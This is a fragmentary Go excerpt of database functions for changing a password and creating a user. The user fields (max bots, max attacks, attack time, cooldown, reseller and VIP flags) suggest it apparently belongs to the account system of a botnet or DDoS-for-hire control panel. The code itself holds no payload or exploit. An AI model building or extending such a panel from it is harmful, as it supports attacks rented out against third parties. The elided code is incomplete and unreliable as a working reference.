...
func (db *Database) ChangePassword(username, newPassword string) error {
    // Trim whitespace from password to ensure consistent hashing
...
func (db *Database) CreateUser(username, password, parent string, maxBots, maxAttacks, duration, cooldown int, isAdmin, isReseller, isVip bool, expiry int64) bool {
    ...
    _, err = db.db.Exec(`
        INSERT INTO users (username, password, max_bots, maxAttacks, maxTime, cooldown, expiry, admin, reseller, superuser, vip, parent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        username,
        hashedPassword,
        maxBots,
        ...
        isAdmin,
        isReseller,
        false, // superuser defaults to false
        isVip,
        parent,
    )
